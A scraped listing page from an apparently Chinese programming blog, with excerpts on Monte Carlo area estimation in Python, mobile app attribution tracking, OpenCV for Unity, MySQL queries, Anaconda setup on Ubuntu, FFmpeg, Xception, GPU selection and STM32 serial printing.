		 Monte Carlo Monte Carlo算法步骤Monte Carlo优缺点优点：缺点： 例子：以计算半径为1的圆面积为例。result：模拟散点图：计算结果： Monte Carlo算法步骤 （1）循环次数C、计数器s； （2）生成随机数； （3）如果满足条件s+1； （4）模拟结果=s/C。 Monte Carlo优缺点 优点： 1.预测精确； 2.连续和非连续都能处理。 缺点： 1.计确时间通常较长； 2.误差是概率误差。 例子：以计算半径为1的圆面积为例。 #先计算第一象限内的面积 import random import math import matplotlib.pyplot as plt C=2000#循环次数 s=0#计数器 #作图的视野范围 plt.xlim(xmax=1.5,xmin=0) plt.ylim(ymax=1.5,ymin=0) for i in range(C): #生成随机坐标(x,y) x=random.random()#生成0-1之间的随机数 #print(x) y=random.random()#生成0-1之间的随机数 #print(y) y_predict=math.sqrt(1-x**2)#圆在第一象限的函数 #print(y_predict) if y_predict&gt;=y:#坐标点y小于y_predict，才是圆的点，即才符合条件，计数器加1 s=s+1 plt.plot(x,y,'r+') plt.show() #上面计算的是1/4面积，所以要乘4 predict_value=4*s/C print(predict_value) result： 模拟散点图： 计算结果： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ed9ef0b4baf6183d14a987171aa3888/" rel="bookmark">
			归因跟踪，精细化运营的利器！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文来源：量江湖ASM，作者：溪姐
近期iTunes Connect中，苹果发布重要更新功能，增加了新的数据源和指标。CP可以进一步了解用户从哪里发现他的应用，包括在App Store浏览或搜索、其他应用、浏览器。说白了，苹果开始加强它的数据归因跟踪了（此前，苹果数据统计仅限于整体的购买数、付费情况等）。
对数据来源的跟踪，其实也是苹果反作弊在不断升级，对于渠道而言当然是很糟糕的，业内机刷、肉刷、积分墙掺量行为，会受到极大冲击，刷量作弊原形毕露。不过反作弊的事儿，苹果一直在做，自从上线苹果竞价广告以来一直在强化升级。可想，此次归因动作会再次让渠道哭惨，算了溪姐今天不写反作弊了（不能天天得罪人），今天写写为啥归因对CP这么重要，以及关于（移动互联网）归因的延伸知识吧。
苹果更新的归因跟踪，可以监控到哪些数据？ 苹果在iTunes Connect App Analytics信息中心添加了几个数据埋点：
App Store Browse：用户在App Store中浏览“精选”、“类别”或“排行榜”板块时首次查看了您的App或首次轻点了您的App以下载。
App Store Search：用户在App Store上通过“搜索”首次查看了您的App或首次轻点了您的App以下载。其中包括App Store搜索中的Search Ads。
App Referrer：用户通过轻点了App中的链接，客户被带到您的App Store产品页面。其中包括使用StoreKit API来加载您的产品页面的App。
Web Referrer：用户通过轻点了网站中的链接，客户被带到您的App Store产品页面。
总的说来，苹果归因目前主要可以监控三个方面数据：1、引导App来源；2、引导网页来源；3、营销活动来源。当然，还有它自身App Store中用户浏览和搜索行为数据。
苹果新的iTunes Connect数据归因分析，对CP而言是重大利好。App推广运营可以更轻松地分析流量来源数据，以此来优化推广行为和筛选优质渠道。归因数据可以帮CP识别渠道质量，从而进行广告效果评估和结算。
归因跟踪到底是个什么鬼？ 归因，就是说CP需要知道通过多个渠道推广来的广告质量、获取的用户数量、来源等，基于这些数据，可以更好的优化广告投放。比如剔除效果不好的渠道，对质量高的渠道进行加量，或引进新渠道，再不断调整优化。
也就是说，归因跟踪越精准精细，渠道作假越难。另一方面，CP的用户质量会更高（因为不好的渠道被剔除了），更利于精细化运营以及在流量红利殆尽的今天实现用户增长。
归因市场：媒体渠道或独立第三方各有各的归因策略
Facebook：点击后28天内的安装和看过广告24小时内安装也会归因为Facebook安装。
Twitter：点击后14天内的安装都会归因成Twitter数据。
Google：点击后30天内的数据将归因为Google安装。
（看完上面的对比，你就知道，媒体渠道做归因嘛，当然希望把数据多多归给自己啦。不过也能理解，不然怎么好跟你谈钱）
数据归因跟踪对CP来说意味着什么？ 对于CP而言最郁闷的是：广告投出去效果不好，这时会去反推APP产品是不是哪里优化不够好？广告文案不够勾引？渠道策略出了问题？等等，当然以上都对。但是却没人能回答这个问题：我的50%广告花费到底浪费在哪？
这时归因就派上用场了，广告投放是直面用户的最后一环，也是最重要一环，如果你没法归因出投放效果，那么很难做好下一步优化。
在红利殆尽的今天，渠道转化差，用户增长难，广告投放出去结果怎样？想必这些问题CP更想知道：
-用户点了这家渠道的广告，但是点了后安装没安装？
-这次的下载量到底是哪家渠道带来的？下次又该买哪家？
-除了用户引流之外，这个后期转化应该算谁的？怎么算更合理？
大部分广告主在投放APP时都会采用多渠道组合推广，比如海外APP，会采用Facebook、Google、苹果竞价广告或其他媒体渠道等多种渠道投放。对于广告主而言，需要知道用户是从哪个渠道来的？用户质量怎么样？广告购买和用户获取以及用户在APP内行为之间的关系是什么？在实际应用中，归因需求更复杂，比如说，某用户看了信息流广告、点击了社交广告、然后在搜索引擎广告中完成下载行为，那么这个转化应该怎么算？
什么样的归因分析模型更科学？ 严格意义上讲，归因模型分类大体分为单触点和多触点两类。为了方便理解，溪姐给大家介绍四种常见的归因模型。
1、最终互动模型：100%分配给转化前用户最后一次接触的媒体，这样也容易测量，但属于单触点模式，不完善，适合转化型广告主。
2、首次互动模型：100%分配给第一次接触的渠道，只考虑最初的品牌认知、不考虑转化，适合全新品牌。
3、时间衰减互动模型：配比按时间递减，适合临时促销广告。
4、自定义互动模型：自定义个阶段配比，适合销售和品牌同样重视的广告。
在实际用户转化路径中，用户在今日头条看见并点击了苹果手机广告，又在朋友圈点击了推送广告，回去之后在PC端用百度搜索了苹果新机型，然后点击百度上京东商城广告，在京东商城完成购买行为，这是比较常见的从广告展现到用户转化的流程，如果采用最终互动归因模型，只会对百度出现的京东商城广告做效果考核，而那些前置广告因素所产生的广告行为则不计算，等于说100%给最终接触的渠道。
如果按首次互动模型，则将效果归因给今日头条广告，无论是首次互动还是最终互动，这两种都属于单触点归因模式，在多渠道组合投放中这种归因方式比较片面。用户接触的各个渠道，它体现了展示率，而且可能对用户来说产生了隐形转化，采用单触点归因，对于其他广告形式来说是非常不公平的，因为它在用户整个购买过程中也起了作用。
更科学的归因方法需要考虑用户的综合行为，即多触点归因，它通过一套算法或者模型去做分配，举个例子，用户在百度看见广告，但是没有完成购买行为，第二天再通过今日头条完成了购买行为我会分出70%的效果给今日头条，而30%的效果则给百度。多触点归因会通过跨设备，跨屏，跨渠道去综合评估，给出一个更合理的效果分配比例。
后记： 不做数据归因分析，就无法知道广告花费到底浪费在哪个环节，在大数据技术逐渐完善的今天，有了实现归因分析的土壤，归因可以发挥出更大价值。苹果归因的升级，将会推动国内归因分析的发展，对于CP而言，在红利尽失的今天，归因是运营新的突破口，通过归因分析得到的结果也许是成本节省30%，转化提升50%。说到底，归因就是要撕开一条新鲜的运营口子，抓住被忽视却大有价值的流量与新增。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ed8b3b630c44b8975b67550cd8c19dd/" rel="bookmark">
			OpenCVforUnity中Texture2D格式转换为OpenCV中的Mat格式——Texture2DToMatExample案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OpenCV for Unity（2.3.2）插件中的Texture2DToMatExample案例（Unity2018.2.6f1）
位置：OpenCVForUnity\Examples\Basic\Texture2DToMatExample
目录
一、功能概括
二、场景结构
三、主要功能脚本
一、功能概括 该案例中主要展示了Texture2D格式与OpenCV中的Mat格式是如何转换的。
场景中又一个立方体，贴图为戴帽子的人这张图片。
二、场景结构 场景中包括四个物体
Cube 立方体主要用来作为展示对比图片的容器，改物体包含实现图形对比的主要脚本。
Main Camera 摄像机
Canvas UI的画布，该案例中主要用来放置Back Button,返回案例列表
EventSystem依附Canvas的必须
三、主要功能脚本 场景中只有Cube物体上有Script，其中TouchController脚本是控制鼠标点击控制立方旋转的，Texture2DToMatExample脚本是实现主要功能的脚本。
Utils.setDebugMode (true); Utils是OpenCV中的工具类，调用setDebugMode（bool debugMode, bool throwException = false）方法，该方法主要是设置输出模式， debugMode =true，OpenCV的错误日志将显示在Unity编辑器控制台，如果throwException为true，throw CvException 被Debug.logError替代。
//加载图片作为Texture2D Texture2D imgTexture = Resources.Load ("lena") as Texture2D; //定义Mat格式 Mat imgMat = new Mat (imgTexture.height, imgTexture.width, CvType.CV_8UC4); //转换Texture2D为Mat格式 Utils.texture2DToMat (imgTexture, imgMat); 1定义Mat
Mat (int rows, int cols, int type)
rows是Mat的高度，col是Mat的宽度，typeMat的模式，CvType.CV_8UC4是8位无符号四通道带透明色RGB图像
2Texture2D转Mat
texture2DToMat (Texture2D texture2D, Mat mat, bool flip = true, int flipCode = 0)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9ed8b3b630c44b8975b67550cd8c19dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b829d905f63fd95cdbd5facb1714175f/" rel="bookmark">
			常用工具网址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		名称
备注
网址
Greasy Fork
浏览器脚本
https://greasyfork.org/zh-CN/scripts
在线工具
http://www.egouz.com/tools/
学习资料库
http://www.xuexi111.com/
Smallpdf
PDF转换
https://smallpdf.com/
百度语音
文字转语音
http://developer.baidu.com/vcast
搬运工
http://www.banyungong.org/category/100.html
异次元
https://www.iplaysoft.com/
一行代码
https://www.alinecode.com/
翻译助手
翻译
http://dict.cnki.net/
可酯
翻译
http://www.jukuu.com/
词都
翻译
http://www.dictall.com/
Dictionary
翻译
https://dict.naver.com/linedict/zhendict/#/cnen/home
Glosbe
https://glosbe.com/
MSDN
https://msdn.itellyou.cn/
考研
http://bbs.kaoshidian.com/resource
小木虫
http://muchong.com/bbs/index.php
考研网
http://download.kaoyan.com/
传媒人网
http://www.chuanmeiren.cn/bbs/
PDF之家
http://www.pdfzj.com/
LOGO
http://www.uisdc.com/top-logo-design-resources
https://www.uisdc.com/free-hd-picture-website
搜书
https://www.jiumodiary.com/
好戏网
https://www.mask9.com/
DIY
http://www.rouding.com/
导航
https://lai.yuweining.cn/fuli.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44e8020996345c736ed4309f8a7e89c1/" rel="bookmark">
			mysql表单内容的查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查询所有字段:select * from student;
查询指定字段:select name,class_no from student;
查询符合条件字段的列:select name from student where id=3;
select name from student where id between 1 and 4;
select name from student where name like '耗%';
通配符: _ 代替一个字符 %替代多个字符
一般使用!=,用&lt;&gt;代替
= , &lt;&gt;, !=, &gt;,&lt;,&gt;=,&lt;=,between ... and ...
列名 between ... and ...
列名 like ...
条件 and 条件2
or 和and一样使用
and 可以用 &amp;&amp; 代替
in操作符用来满足条件用的,不过效率低
select * from student where id in(1,2,3,4);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44e8020996345c736ed4309f8a7e89c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cd92d6524bda8201585139391262de8/" rel="bookmark">
			opencv学习之高斯滤波GaussianBlur()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.csdn.net/keith_bb/article/details/54412493?locationNum=11&amp;fps=1
这是一篇很好的学习opencv中GaussianBlur(),
谢谢博主，
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/126511af6e9ab3b5191d3d05a518ee14/" rel="bookmark">
			Mysql explain 中type 类型说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先： explain 的作用： 可以通过explain 去记录展示 MySQL数据库运行的的相关参数；进行慢查询分析优化；
Mysql 中explain中type 类型说明：(级别由低到高，查询速度越来越快) ALL --全表扫描，查找匹配的行，（这个是最慢的）
INDEX-- 使用索引 where 条件中没有用到索引，但是用索引就能完成扫描全表； 速度有提升；
RANGE ----使用索引范围扫描，索引范围扫描，常见于&lt;、&lt;=、&gt;、&gt;=、between等操作符； REF----使用非唯一性索引或者唯一索引的前缀扫描，返回匹配某个单独值的记录行; 使用了前缀索引
eq_ref--- 相对于ref来说就是使用的是唯一索引，对于每个索引键值，只有唯一的一条匹配记录； 一般用于联表查询；
CONST or SYSTEM --- 这个是通过索引很快技能定位到一行匹配的数据，就像一个常量一行（很快）；
单表中最多只有一条匹配行，查询起来非常迅速，
select * from table_name where tableI_id =' '
table_id 为主键索引，或则唯一索引，
NULL --- 这个是sql 语句是不经过表就能返回结果的 select 1 from dual; 不通过表就能查询到数据。
截图留念
第二个知识点： 首先是:什么是索引？ 为什么要建立索引？
建立索引的目的是：加快表的查询速度，若一张表数据量很小，很快就能找到想要的信息，这样就不需要建立索引，随着表的 数据量增加，这个时候就需要扫描全表，查询到匹配的信息，这样就需要花费更多的时间，这样索引就出
并且很快就能到数据。
建立索引有两种方式： Btree Hash; 现在都采用B+ tree;
索引的分类： |---单列索引
|---普通索引 就是纯碎的建立索引，就是为了查询快一点，可有有空值，可以有重复值；
|---唯一索引 单列的值保证不能重复，但是可以有空值，只能有一个；
|---主键索引 特殊的唯一索引，主键值不能为空值
|---组合索引
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/126511af6e9ab3b5191d3d05a518ee14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b6c22d26f70a97c0c66791939850239/" rel="bookmark">
			二维码跳转公众号，小程序的流程和方式总结。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 工作和开发中常常碰到，需要生成一个二维码跳转到特定公众号和小程序的地方。而且特别容易混淆，下面总结和梳理一下。
二维码跳转公众号。 通过 https://open.weixin.qq.com/connect/oauth2/authorize?appid=[appid]&amp;redirect_uri=[公众号url]&amp;response_type=code&amp;scope=snsapi_base&amp;state=1&amp;connect_redirect=1#wechat_redirect 来跳转，其中appid是公众号id，redirect_uri 是公众号的实际网址。有的二维码网站https://cli.im/vcard 扫描出来的url 如下 https://w.url.cn/s/Av4ufL8 这个其实就是上面 url的精简版，通过浏览器打开就会转换成 https://open.weixin.qq.com/connect/oauth2/authorize?appid=[appid]&amp;redirect_uri=[公众号url]&amp;response_type=code&amp;scope=snsapi_base&amp;state=1&amp;connect_redirect=1#wechat_redirect 这样的形式。 二维码跳转小程序。 官方提供一共提供两种方式，一种是普通二维码跳转规则。第二种是通过接口直接获取的小程序专用二维码。 第一种方式，通过小程序后台配置一个url，该url需要进行校验，然后通过该url和参数生成的普通二维码就可以跳转到小程序 https://developers.weixin.qq.com/miniprogram/introduction/qrcode.html#功能介绍，需要注意的是小程序必须要发布状态才可以。第二种方式需要调微信的API，步骤是先获取 appid，appsecret，然后根据这两个生成 access_token.然后根据access_token 生成小程序专用二维码，官方文档参考 https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/qr-code.html 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f1de2871ce5631ee6bb12576f78b316/" rel="bookmark">
			星星 效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://pan.baidu.com/s/1cZosAQgaGC_0RJH_BE0qyg#list/path=%2Fsharelink1682068415-67522119946802%2F%E5%8F%AF%E4%B8%8A%E4%BC%A0%E5%8A%A8%E7%94%BB%2F%E4%BA%91%E6%9C%B5&amp;parentPath=%2Fsharelink1682068415-67522119946802
star.html
&lt;!DOCTYPE html&gt;
&lt;html &gt;
&lt;head&gt;
&lt;meta charset="UTF-8"&gt;
&lt;title&gt;纯CSS打造星空粒子特效 | jQuery特效|手机微信网站特效| 网页特效库&lt;/title&gt;
&lt;meta name="keywords" content="canvas动画, 手机微信网站特效, css3动画, html5特效, 网页特效" /&gt;
&lt;meta name="description" content="网页特效库-专注于HTML5、CSS3、js、jQuery、手机移动端等网页特效的手机与分享。特效库始终坚持：无会员、无积分、无限制的“三无原则”，所有的资源都免费提供广大童鞋下载学习和使用。" /&gt;
&lt;!--&lt;script src="js/modernizr.js" type="text/javascript"&gt;&lt;/script&gt;--&gt;
&lt;!--&lt;link rel="stylesheet" href="css/normalize.css"&gt;--&gt;
&lt;style&gt;
/* NOTE: The styles were added inline because Prefixfree needs access to your styles and they must be inlined if they are on local disk! */
html {
height: 100%;
background:#000;
/*background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);*/
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f1de2871ce5631ee6bb12576f78b316/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b85dbd307fe47d6e61432a33e6047ef1/" rel="bookmark">
			服务器（Linux-Ubuntu）卸载并安装Anaconda、tensorflow-gpu及Conda常用操作命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前在服务器上跑深度学习代码时，一直用的虚拟环境，安装很多包的时候需要管理员权限。
虚拟环境安装教程推荐：https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432712108300322c61f256c74803b43bfd65c6f8d0d0000
最近重新配置了anaconda环境，本文记录了安装工程。
一、卸载之前安装过的Anaconda 在安装新的anaconda时，有时候会提示已经存在Anaconda，可能是账号的前一个主人安装的，要安装自己的anaconda就必须得先卸掉之前的，
ERROR: File or directory already exists: '/home/user7/anaconda2' If you want to update an existing installation, use the -u option. 可用“rm -rf anaconda2”命令直接将之前的文件夹删除即可（删之前得确保里面没有有用信息）
[user7@~]$cd anaconda2 [user7@~/anaconda2]$source ./bin/activate (root) [user7@~/anaconda2]$conda --version conda 4.2.9 (root) [user7@~/anaconda2]$source deactivate [user7@~]$rm -rf anaconda2 二、安装自己的anaconda 下载需要的anaconda版本，注意：Anaconda3和Anaconda2分别只支持python2和python3，所以请根据自己的python版本下载。
Anaconda2：
[user7@~/anaconda22]$ wget https://repo.anaconda.com/archive/Anaconda2-5.3.0-Linux-x86_64.sh Anaconda3：
[user7@~/anaconda22]$ wget https://repo.anaconda.com/archive/Anaconda3-5.3.1-Linux-x86_64.sh 下载完之后，进入anaconda包所在文件夹，运行 “bash” 命令安装：
[user7@~/anaconda2]$cd [user7@~]$cd anaconda22 [user7@~/anaconda22]$ls Anaconda2-5.3.0-Linux-x86_64.sh [user7@~/anaconda22]$bash Anaconda2-5.3.0-Linux-x86_64.sh 中间会让阅读许可证信息，一路enter，然后输入“yes”即可。出现installation finished说明安装完成，之后可能会问你要不要安装VSCode，这个根据自己需求选择yes或no。
三、测试anaconda是否安装成功 首先需要退出当前文件夹，因为anaconda在安装时新建了anaconda2文件夹（以anaconda2为例），所以要激活anaconda必须得进入到这个文件夹中。“source ./bin/activate”命令激活，“source deactivate”命令退出。
[user7@~/anaconda22]$cd [user7@~]$cd anaconda2 [user7@~/anaconda2]$source .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b85dbd307fe47d6e61432a33e6047ef1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ba596c7c96a151ee9b33dbed39a5fed/" rel="bookmark">
			[React Native]Action dispatch无法传递到redux
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新手问题:function mapDispatchToProps(dispatch) 需要通过function mapDispatchToProps(dispatch) 关联起来才能调用机制。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/158cc400c1726f2c9f4cfa562ae1b78d/" rel="bookmark">
			Xception
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 论文信息Xception 设计进化深度可分离卷积 Depthwise Separable ConvolutionXception 网络架构Xception 微调 论文信息 原文地址： Xception：Deep Learning with Depthwise Separable Convolutions
作者：François Chollet
Xception 设计进化 Xception 是 Google 继 Inception 后提出的对 Inception-v3 的另一种改进。作者认为，通道之间的相关性 与 空间相关性 最好要分开处理。采用 Separable Convolution（极致的 Inception 模块）来替换原来 Inception-v3中的卷积操作。 结构的变形过程如下：
在 Inception 中，特征可以通过 1 × 1 1×1 1×1 卷积， 3 × 3 3×3 3×3 卷积， 5 × 5 5×5 5×5 卷积，pooling 等进行提取，Inception 结构将特征类型的选择留给网络自己训练，也就是将一个输入同时输给几种提取特征方式，然后做 concat 。Inception-v3的结构图如下: 对 Inception-v3 进行简化，去除 Inception-v3 中的 avg pool 后，输入的下一步操作就都是 1 × 1 1×1 1×1 卷积： 提取 1 × 1 1×1 1×1 卷积的公共部分： Xception（极致的 Inception）：先进行普通卷积操作，再对 1 × 1 1×1 1×1 卷积后的每个channel分别进行 3 × 3 3×3 3×3 卷积操作，最后将结果 concat： 深度可分离卷积 Depthwise Separable Convolution 传统卷积的实现过程：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/158cc400c1726f2c9f4cfa562ae1b78d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae4197a52b59adaa1e356edcb9c8edae/" rel="bookmark">
			FFmpeg代码实现视频剪切
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有几天没写FFmpeg代码了，今天趁着有空闲来撸下FFmpeg剪切视频代码，我也是边学习边写，如果有错误，请在评论中指出，互相学习。
思路 说起来这个功能的实现也很简单，给定一个起始时间、一个结束时间，把视频文件打开，然后把容器中的每条流从起始时间开始，到结束时间为止的数据拷贝到输出流，然后输出流保存为容器，这样就能看到一个剪切后的视频文件了。
代码实现 第一步 定义参数 AVFormatContext *ifmt_ctx = NULL; AVFormatContext *ofmt_ctx = NULL; AVOutputFormat *ofmt = NULL; AVPacket pkt; double start_seconds； //开始时间 double end_seconds； //结束时间 const char *in_filename； //输入文件 const char *out_filename；//输出文件 复制代码 第二步 初始化上下文 avformat_open_input(&amp;ifmt_ctx, in_filename, 0, 0); //本质上调用了avformat_alloc_context、av_guess_format这两个函数，即创建了输出上下文，又根据输出文件后缀生成了最适合的输出容器 avformat_alloc_output_context2(&amp;ofmt_ctx, NULL, NULL, out_filename); ofmt = ofmt_ctx-&gt;oformat; 复制代码 第三步 创建流及参数拷贝 for (i = 0; i &lt; ifmt_ctx-&gt;nb_streams; i++) { AVStream *in_stream = ifmt_ctx-&gt;streams[i]; AVStream *out_stream = avformat_new_stream(ofmt_ctx, NULL); if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae4197a52b59adaa1e356edcb9c8edae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3131fbba04289c6a8285021eeff063d2/" rel="bookmark">
			android arcgis（100.0.0）ArcGISMapImageLayer 图片图层点击查询要素属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求：使用ArcGISMapImageLayer加载业务图层，当点击图层任意一点时，如何获取当前点的数据
注意：mTable.queryFeaturesAsync(query, ServiceFeatureTable.QueryFeatureFields.LOAD_ALL);方法可设置返回数据的全部字段还是部分字段，未设置会默认返回三个字段（一把辛酸泪）
mainMapView.setOnTouchListener(new DefaultMapViewOnTouchListener(mainActivity, mainMapView) { @Override public boolean onSingleTapConfirmed(final MotionEvent e) { //获取屏幕点击点(android.graphics.Point) final Point clickPoint = new Point(Math.round(e.getX()), Math.round(e.getY())); com.esri.arcgisruntime.geometry.Point point = mainMapView.screenToLocation(clickPoint); QueryParameters query = new QueryParameters(); query.setGeometry(point); ServiceFeatureTable mTable = new ServiceFeatureTable(stringUrl);//得到查询属性表stringUrl为图层地址 final ListenableFuture&lt;FeatureQueryResult&gt; featureQueryResult= mTable.queryFeaturesAsync(query, ServiceFeatureTable.QueryFeatureFields.LOAD_ALL);//不设置load_all的话，会默认获取三个字段，若加载全部数据，需设置为load_all featureQueryResult.addDoneListener(new Runnable() { @Override public void run() { FeatureQueryResult result = null; try { result = featureQueryResult.get(); Iterator&lt;Feature&gt; iterator = result.iterator(); Feature feature; while (iterator.hasNext()) { feature = iterator.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3131fbba04289c6a8285021eeff063d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f596ceed703f75ba5cf8693d32a31e1/" rel="bookmark">
			Failed to load resource: the server responded with a status of 403
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Failed to load resource: the server responded with a status of 403 () personList.html:1 Failed to load http://192.168.0.103/person/getList: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://127.0.0.1:8020' is therefore not allowed access. The response had HTTP status code 403. 前后端联调时，出现如上的错误，可能是因为contentType指定不恰当或者后端要求数据格式不匹配引起的
后端不要求json格式，但是前端是json格式
前端：
$(function(){ $.ajax({ type:"get", url:"http://192.168.0.103/person/getList", dataType:"json", contentType:"application/json;charset=utf-8", success:function(result){ alert(result); } }); }); 后端：
@RequestMapping(value = "/getList", produces = MediaType.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f596ceed703f75ba5cf8693d32a31e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e20cf4957c7bb155c8ec67a01becd23e/" rel="bookmark">
			27 降低方差的技巧（Techniques for reducing variance）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 如果你的算法方差较高，可以尝试下面的技巧：
**增加训练数据：**只要你可以获得大量数据和足够的算力去处理数据，这就是一种解决高方差问题最简单，最可靠的方式。**正则化（L2, L1, dropout）：**这种技巧减少方差的同时，增加了偏差。**提前停止（例如，根据开发集的错误率来提前停止梯度下降）：**这种技巧减少方差的同时增加的偏差。提前停止技巧很像正则化方法，一些论文作者也叫他正则化技巧。**特征选择来减少输入特征的数量或类型：**这种技巧可能会处理好方差问题，但是同时会增大偏差。稍微减少特征数量（比如从1000个特征减少到900个特征）不太可能对偏差产生大的影响。大量减少特征数量（比如从1000减少到100-减少10倍）可能产生较大偏差，因为去掉了很多有用的特征。（注：可能会欠拟合）。在现代的深度学习中，数据量很大，人们对待特征选择的态度出现了转变，现在我们更加倾向于使用全部的特征，让算法自己选择合适的特征。但是当训练集比较小时，特征选择非常有用。**缩小模型（例如减少网络层数和神经元数量）：**谨慎使用。这种技巧可以减少方差，同时也可能增加偏差。然而，我并不推荐使用这种技巧来解决方差问题。添加正则化通常会获得更好的分类性能。缩小模型的优点在于减少计算成本，以更快的速度来训练模型。如果模型的训练速度非常重要，那么就想尽一切方法来缩小模型。但是如果目标是减少方差，不是那么在意计算成本，可以考虑添加正则化。 下面是2种和前一节重复的解决偏差问题的策略：
**基于误差分析带来的灵感来修改输入特征：**比方说你通过误差分析决定添加额外的特征以解决一类特定的错误。新的特征可以对方差的偏差都有好处。理论上，添加特征可能增加方差，如果确实增加了方差，那么可以使用正则化来消除增加的方差。**修改模型（比如神经网络）：**修改模型使其更加适合要解决的问题。这种方式会同时影响到偏差和方差。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c44dc2b651b6e9b337faf2e92b166e6d/" rel="bookmark">
			指定GPU运行python程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、命令行运行python程序时
1、首先查看哪些GPU空闲，nvidia-smi显示当前GPU使用情况。
nvidia-smi 2、然后指定空闲的GPU运行python程序。
CUDA_VISIBLE_DEVICES=0,2,3 python test.py 二、在python程序中指定GPU
import os os.environ["CUDA_VISIBLE_DEVICES"] = "0,2,3" PS：周期性输出GPU使用情况
每 10s 显示一次GPU使用情况：
watch -n 10 nvidia-smi 转载于:https://www.cnblogs.com/tyty-Somnuspoppy/p/10071716.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e09bea1330e61eed8bfbbffc78600c1/" rel="bookmark">
			STM32CubeMX串口配置及库printf打印
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最新版STM32CubeMXV5.0.0已经上传到了网盘，或者自己通过软件在线升级。
STM32CubeMX运行环境搭建包含两个部分。首先是 Java运行环境安装，其次是STM32CubeMX软件安装。Java 软件和STM32CubeMX 软件都可以在官网找到最新的下载。
1. Java运行环境，大家可以到 Java 官网 www.java.com下载最新的 Java 软件；
2.STM32CubeMX可以在ST官网www.st.com/content/st_com/zh.html下载最新的版本；
3.或者在我网盘上下载全部所需软件资料，链接：https://pan.baidu.com/s/1kWUH08n 密码：4th4
新版的STM32CubeMXV5.0.0界面变化较大。
1、打开STM32CubeMXV5.0.0，创建工程，配置串口。
2、打开工程，编译。
/* Private includes ----------------------------------------------------------*/ /* USER CODE BEGIN Includes */ #include &lt;stdio.h&gt; //第一步包含头文件 /* USER CODE END Includes */ ...... ...... ...... /* Private user code ---------------------------------------------------------*/ /* USER CODE BEGIN 0 */ int fputc(int c, FILE *stream) //重写fputc函数 { /* huart1是工具生成代码定义的UART1结构体， 如果以后要使用其他串口打印，只需要把这个结构体改成其他UART结构体。 */ HAL_UART_Transmit(&amp;huart1, (unsigned char *)&amp;c, 1, 1000); return 1; } /* USER CODE END 0 */ .
	</div>
	<div class="list__footer clearfix">
